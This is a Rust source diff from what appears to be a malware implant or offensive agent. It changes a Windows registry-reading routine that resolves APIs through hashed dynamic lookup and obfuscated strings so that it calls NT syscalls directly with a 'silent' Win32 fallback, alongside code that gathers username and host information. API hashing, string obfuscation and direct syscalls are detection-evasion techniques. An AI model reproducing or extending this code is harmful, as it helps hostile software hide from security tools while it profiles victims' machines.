@@ -2,45 +2,11 @@
 //! All Win32 access goes through hashed dynamic resolution (resolve.rs).
 
 use crate::info::Info;
-use crate::resolve::{resolve, wide};
-
-const HKEY_LOCAL_MACHINE: usize = 0x8000_0002;
-const RRF_RT_ANY: u32 = 0x0000_ffff;
-
-type FnRegGetValueW = unsafe extern "system" fn(
-    hkey: usize,
-    subkey: *const u16,
-    value: *const u16,
-    flags: u32,
-    pdwtype: *mut u32,
-    data: *mut u8,
-    cbdata: *mut u32,
-) -> i32;
+use crate::resolve::resolve;
 
 fn reg_read_string(subkey: &str, value: &str) -> Option<String> {
-    unsafe {
-        let f: FnRegGetValueW = std::mem::transmute(resolve(&crate::obf!("advapi32.dll"), crate::api!("RegGetValueW")));
-        if f as usize == 0 {
-            return None;
-        }
-        let mut buf = vec![0u8; 512];
-        let mut len = buf.len() as u32;
-        let status = f(
-            HKEY_LOCAL_MACHINE,
-            wide(subkey).as_ptr(),
-            wide(value).as_ptr(),
-            RRF_RT_ANY,
-            std::ptr::null_mut(),
-            buf.as_mut_ptr(),
-            &mut len,
-        );
-        if status != 0 || len < 2 {
-            return None;
-        }
-        let u16s = std::slice::from_raw_parts(buf.as_ptr() as *const u16, (len as usize) / 2);
-        let end = u16s.iter().position(|&c| c == 0).unwrap_or(u16s.len());
-        Some(String::from_utf16_lossy(&u16s[..end]).trim().to_string())
-    }
+    // NT syscall path (NtOpenKey/NtQueryValueKey) with silent Win32 fallback.
+    crate::ntreg::read_string(crate::ntreg::HKEY_LOCAL_MACHINE, subkey, value)
 }
 
 fn username() -> String {
